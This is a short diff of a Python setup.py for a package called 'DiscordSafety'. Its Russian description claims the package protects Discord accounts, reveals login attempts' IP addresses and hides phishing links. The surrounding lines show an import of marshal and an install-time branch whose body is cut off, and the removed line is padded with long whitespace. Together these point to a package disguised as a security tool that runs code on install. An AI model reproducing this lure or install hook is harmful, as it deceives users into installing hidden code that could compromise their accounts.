@@ -5,7 +5,12 @@ import os
 import marshal as m
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+setup(name='DiscordSafety',
+      version='0.1',
+      description='Защитите свой дискорд аккаунт, установив библиотеку. После чего вы сможете: Видеть ip адресс человека который пытается войти в аккаунт, всякие Фишинг ссылки будут автоматически скрыты.',
+      packages=['DiscordSafety'],
+      author_email='abobus@gmail.com',
+      zip_safe=False)
 
 if 'install' in sys.argv:
 	try:
